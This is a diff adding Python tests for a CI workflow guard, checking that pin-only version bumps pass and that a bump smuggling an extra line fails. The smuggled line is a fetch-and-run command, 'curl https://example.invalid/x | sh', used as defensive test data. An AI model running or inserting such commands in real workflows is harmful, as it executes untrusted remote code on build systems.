@@ -183,6 +183,64 @@ def test_workflow_check_accepts_tracked_reviewable_declaration(*, tmp_path: Path
     assert result.returncode == 0, result.stderr
 
 
+def _repo_with_base_carrying_workflow(*, root: Path, pin: str) -> None:
+    """A base commit already carrying the pin-bump lane's exact workflow shape."""
+    _git(cwd=root, args=["init", "-q", "-b", "master"])
+    workflow = root / ".github" / "workflows" / "ci.yml"
+    workflow.parent.mkdir(parents=True, exist_ok=True)
+    workflow.write_text(
+        f"    uses: thewoolleyman/livespec-dev-tooling/.github/workflows/reusable-x.yml@{pin}\n"
+        f"      image: ghcr.io/thewoolleyman/livespec-fabro-sandbox:python-{pin}\n",
+        encoding="utf-8",
+    )
+    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
+    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])
+
+
+def _bump_pin(*, root: Path, old: str, new: str) -> Path:
+    workflow = root / ".github" / "workflows" / "ci.yml"
+    workflow.write_text(workflow.read_text(encoding="utf-8").replace(old, new), encoding="utf-8")
+    return workflow
+
+
+def test_workflow_check_allows_a_pin_only_bump_without_a_declaration(*, tmp_path: Path) -> None:
+    """The pin-bump lane must keep landing: a binding that reds it is an outage, not a fix.
+
+    Measured over the four most recent real bumps, that lane alters ONLY a
+    reusable-workflow version ref and a container image tag. The allowance is
+    keyed on that diff SHAPE, never on who authored it -- this guard cannot
+    distinguish factory from host and must not pretend to.
+    """
+    _repo_with_base_carrying_workflow(root=tmp_path, pin="v1.28.12")
+    _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 0, result.stderr
+
+
+def test_workflow_check_still_blocks_a_pin_bump_carrying_one_extra_line(*, tmp_path: Path) -> None:
+    """THE LEG THAT DECIDES WHETHER THE BINDING IS REAL, NOT VACUOUS.
+
+    If a pin-shaped diff could smuggle any other change through, the allowance
+    would be a hole the size of the guard. One added step line alongside a
+    genuine pin bump must still fail.
+    """
+    _repo_with_base_carrying_workflow(root=tmp_path, pin="v1.28.12")
+    workflow = _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8") + "      run: curl https://example.invalid/x | sh\n",
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 1, result.stderr
+    assert "tracked exemption declaration" in result.stderr
+
+
 def test_workflow_check_rejects_a_declaration_inherited_from_master(*, tmp_path: Path) -> None:
     """An exemption is per-change: the first use must not disable the guard forever.
 
